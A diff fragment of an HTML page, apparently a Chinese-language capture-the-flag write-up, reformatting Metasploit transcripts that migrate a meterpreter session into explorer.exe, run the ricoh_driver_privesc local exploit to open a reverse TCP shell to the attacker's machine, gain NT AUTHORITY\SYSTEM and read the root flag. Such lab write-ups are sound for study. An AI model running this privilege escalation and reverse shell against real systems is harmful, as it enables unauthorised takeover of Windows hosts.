-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate -N explorer.exe</span><br><span class="line">[*] Migrating from 632 to 3128...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure>
-
+<pre><code>meterpreter &gt; migrate -N explorer.exe
+[*] Migrating from 632 to 3128...
+[*] Migration completed successfully.
+</code></pre>
 <h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>然后记住所用的session 再执行一遍命令就可以正常运行了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/local/ricoh_driver_privesc) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.3:5555</span><br><span class="line">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span><br><span class="line">[+] The target appears to be vulnerable. Ricoh driver directory has full permissions</span><br><span class="line">[*] Adding printer XMZLG...</span><br><span class="line">[*] Sending stage (203846 bytes) to 10.10.11.106</span><br><span class="line">[+] Deleted C:\Users\tony\AppData\Local\Temp\osbmqr.bat</span><br><span class="line">[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll</span><br><span class="line">[*] Meterpreter session 5 opened (10.10.16.3:5555 -&gt; 10.10.11.106:51255) at 2025-10-03 19:24:41 +0800</span><br><span class="line">[*] Deleting printer XMZLG</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; cat /users/administrator/desktop/root.txt</span><br><span class="line">f8a7d8e24abc3bd45d8424ae0e67f6a1</span><br></pre></td></tr></table></figure>
+<pre><code>msf exploit(windows/local/ricoh_driver_privesc) &gt; run
+[*] Started reverse TCP handler on 10.10.16.3:5555
+[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)
+[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
+[*] Adding printer XMZLG...
+[*] Sending stage (203846 bytes) to 10.10.11.106
+[+] Deleted C:\Users\tony\AppData\Local\Temp\osbmqr.bat
+[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
+[*] Meterpreter session 5 opened (10.10.16.3:5555 -&gt; 10.10.11.106:51255) at 2025-10-03 19:24:41 +0800
+[*] Deleting printer XMZLG
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; cat /users/administrator/desktop/root.txt
+f8a7d8e24abc3bd45d8424ae0e67f6a1
+</code></pre>
+
     </div>
 
     
